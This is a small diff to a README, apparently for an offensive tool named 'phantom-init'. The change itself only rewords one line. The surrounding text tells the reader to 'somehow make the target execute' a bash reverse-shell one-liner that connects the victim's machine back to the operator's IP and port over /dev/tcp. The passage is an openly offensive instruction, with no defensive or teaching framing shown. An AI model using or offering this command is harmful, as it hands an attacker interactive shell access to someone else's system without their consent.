@@ -23,7 +23,7 @@ phantom-init  [ip=][port1=][port2=]
 
 You have to somehow make the target execute this code, so that he connects to the port1:  
 **bash -c 'bash &>/dev/tcp/ip/port1 0>&1 &'**  
-ip and 1st-port are the ones specified above.
+ip and port1 are the ones specified above.
 
 ## Files
 
